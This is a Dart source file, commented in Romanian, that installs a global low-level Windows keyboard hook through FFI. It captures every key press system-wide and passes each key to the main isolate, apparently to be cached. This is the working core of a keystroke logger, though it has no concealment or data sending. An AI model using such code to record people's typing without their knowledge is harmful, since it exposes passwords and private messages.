import 'dart:ffi';
import 'dart:isolate';

import 'package:schema/native_functions/DispatchMessage.dart';
import 'package:schema/native_functions/GetMessage.dart';
import 'package:schema/native_functions/SetWindowsHookEx.dart';
import 'package:schema/native_functions/TranslateMessage.dart';
import 'package:schema/native_types/MSG.dart';
import 'package:schema/constants.dart';
import 'package:schema/functions/addToCache.dart';
import 'package:schema/functions/toCorrectKey.dart';
import 'package:schema/globals.dart';
import 'package:schema/native_functions/CallNextHookEx.dart';
import 'package:schema/native_types/KBDLLHOOKSTRUCT.dart';

/// un isolate ca sa nu tin mainul ocupat cu [GetMessage]
void MSGIsolate(SendPort isolateToMainStream) {
  // am nev de asta pt a putea trimite mesaje inapoi din c
  MSGIsolateToMain = isolateToMainStream;

  // trimit un msj ca am inceput
  isolateToMainStream.send('started');

  // convertesc WindowsHookCallback in lpfn ca poata fi chemat din c
  final Pointer<NativeFunction<HookCallback>> lpfn =
      Pointer.fromFunction<HookCallback>(WindowsHookCallback, 0);

  // initializez hhook ca sa pot continua callbackurile din c
  hhook = SetWindowsHookEx(WH_KEYBOARD_LL, lpfn, hmod, 0);

  // am nev msg ca sa pot face loopul GetMessage
  final MSG msg = MSG.allocate();

  // loopul GetMessage
  // nush dc am nev de el dar l am pus aici si nu merge fara el
  // blocheaza orice operatie async in isolate
  // pentru cv async trb sa folosesc MSGIsolateToMain sa trimit catre main
  // ce vr sa fac si de acolo ma descurc
  while (GetMessage(msg.addressOf, 0, 0, 0) != 0) {
    TranslateMessage(msg.addressOf);
    DispatchMessage(msg.addressOf);
  }
}

/// prin asta trece fiecare mesaj de la SetWindowsHookEx(WH_KEYBOARD_LL, lpfn, hmod, 0)
int WindowsHookCallback(int nCode, int wParam, int lParam) {
  if (nCode == 0) {
    // daca ii o apasare de tasta
    if (wParam == WM_KEYDOWN) {
      // converteste lParam in KBDLLHOOKSTRUCT pentru a putea fi folosit in dart
      KBDLLHOOKSTRUCT kbdStruct =
          Pointer.fromAddress(lParam).cast<KBDLLHOOKSTRUCT>().ref;

      // proceseaza tasta apasata
      final key = toCorrectKey(wParam, kbdStruct.vKCode);

      // trimit tasta inapoi catre main pt a l pune in cache
      MSGIsolateToMain.send(key);
    }
  }

  // pentru a se continua sirul de callbackuri
  return CallNextHookEx(hhook, nCode, wParam, lParam);
}
